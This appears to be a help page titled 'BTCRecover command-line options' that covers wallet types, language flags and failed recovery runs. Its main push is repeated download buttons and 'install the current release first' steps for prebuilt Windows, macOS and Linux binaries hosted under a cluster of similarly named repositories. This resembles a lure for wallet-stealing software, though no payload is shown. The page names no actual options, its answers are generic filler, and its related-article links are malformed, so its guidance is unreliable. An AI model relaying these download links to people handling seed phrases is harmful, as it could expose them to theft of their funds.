<div align="center">
<img src="assets/banner-article.png" alt="BTCRecover command-line options">
</div>

# BTCRecover command-line options

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

BTCRecover is a command-line tool, and almost every failed run comes down to the same handful of choices: which mode, which wallet type, which wordlist or language, and which candidate source. The options exist to pin those down, and the built-in help lists every flag with its current spelling.

## You'll see this if

You have the file or the phrase, you started a run, and the tool either refused the arguments or spent hours on the wrong search.

| What you see | What it usually means | Where to go |
|---|---|---|
| "does not support the lang option" | a language flag was given to a seed type that has none | here |
| "Language needs to be specified if using tokenlist or passwordlist" | a candidate list was given without naming its wordlist language | here |
| A wallet-type error on start | the mode and the artifact do not match | [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md) |
| The run starts but finds nothing | target, rules or positions | [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md) |
| Progress crawls | candidate space too wide, or the GPU not used | [GPU acceleration setup](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-gpu-acceleration-setup.md) |
| Help output scrolls past | pipe it to a file, or page it | here |

## Why it happens

The tool has two families of work  -  recovering a password for a file, and recovering words for a seed  -  and the options differ between them. Passing a flag from one family into the other produces the confusing errors above, which are configuration messages rather than statements about your wallet.

The language option is the clearest example. Older Electrum seed types carry their own fixed wordlist, so a language flag is meaningless to them and is rejected; a candidate list, by contrast, is made of words, so the tool needs to know which list those words belong to. Two different requirements, one option name, and the error messages read as contradictions until you know which mode you are in.

A third cause is version drift. Option names have changed across releases, and a command copied from an old note may fail on a current build not because it is wrong but because it is old. The current release prints its own usage, which is the authority: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).

## Fix

**Install the current release first.** Download and run [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1) from the releases page; the steps below assume that build.

Start from the mode, then add only the options that mode accepts, and read the error as a statement about arguments rather than about the wallet.

1. **Name the mode first.** Password recovery takes a wallet file; seed recovery takes a phrase and a target. Everything else hangs off that choice.
2. **Set the wallet type explicitly** rather than letting a default decide. The type selects the parsing and the derivation, and a wrong type fails silently: [Electrum wallet password and seed recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md).
3. **Add the language only where it applies.** Legacy Electrum seed types reject it; candidate lists require it. If both are in play, the candidate list is the one that needs the language named.
4. **Point at candidate files with absolute paths** and confirm they exist. A missing token list is reported as an empty candidate set, which looks like a finished search.
5. **Set the target for seed work**  -  an address or a wallet  -  and confirm it is the one you expect: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
6. **Run the current release's help** and copy the option names from it, not from an old note.
7. **Write the working command down** beside the backup, so the next run is a copy-paste rather than a reconstruction.

For repeated work, keep the command in a small script file. Two hundred characters typed once and saved is what turns a second recovery from an evening into a minute, and it removes the class of error where a flag is mistyped rather than wrong.

Options fall into five groups, and knowing the group is most of the battle: the mode, the wallet type, the candidate source, the target, and performance. Errors almost always come from mixing groups  -  a candidate-source option handed to a mode that does not accept one, or a target supplied twice because two commands were pasted together. Reading the built-in help by group, rather than line by line, turns a wall of flags into five decisions, and it makes an unfamiliar option obviously out of place instead of merely unfamiliar.

## If that did not work

If the command is accepted and the run still produces nothing, the problem has moved from syntax to inputs.

Check the four inputs in ascending cost: artifact type, target, candidate rules, unknown positions. That order is worth keeping because the first two cost a minute each and the last two cost thought: [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md). If the run was copied from instructions written for a different seed type, the mode itself may be wrong  -  a phrase search where a password search was needed, or the reverse.

Where a run is simply slow, the fix is scope rather than patience: tighten the candidate rules, fix more positions, or move the work to a GPU if the space is genuinely large. A run that would take weeks on one core is not an argument for waiting: [GPU acceleration setup](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-gpu-acceleration-setup.md).

## Prevention

- Save the exact command that worked, with the backup it belongs to.
- Keep the release you used, or note its version beside the command.
- Prefer absolute paths in candidate files and wallet locations.
- Re-read the built-in help after an update rather than trusting memory.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Why does the tool say my seed type does not support the lang option?

Because that seed type carries its own fixed wordlist and has no language choice to make. Remove the language flag for that type; it is only meaningful where a wordlist or candidate list needs identifying.

### Why does it ask for a language when I give a token list?

A token list is made of words, so the tool needs to know which list they come from. Naming the language once resolves it, and it is a different requirement from the seed-type flag that caused the first error.

### Can I run several wallets in one command?

Not in one command; each run takes one target. Several wallets means several runs, which can be scripted  -  see the multiple-file workflow for the practical arrangement.

### Where do I find the current option names?

In the help output of the current release, which is the only version-accurate source. Option names have changed across versions, so copied commands are the most common source of argument errors.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Electrum wallet password and seed recovery]([Electrum wallet password and seed recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md))
- [Token lists and password patterns]([Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md))
- [Checking many wallet files against one list]([Checking many wallet files against one password list](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-multiple-wallets-one-run.md))
- [A recovery run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md))
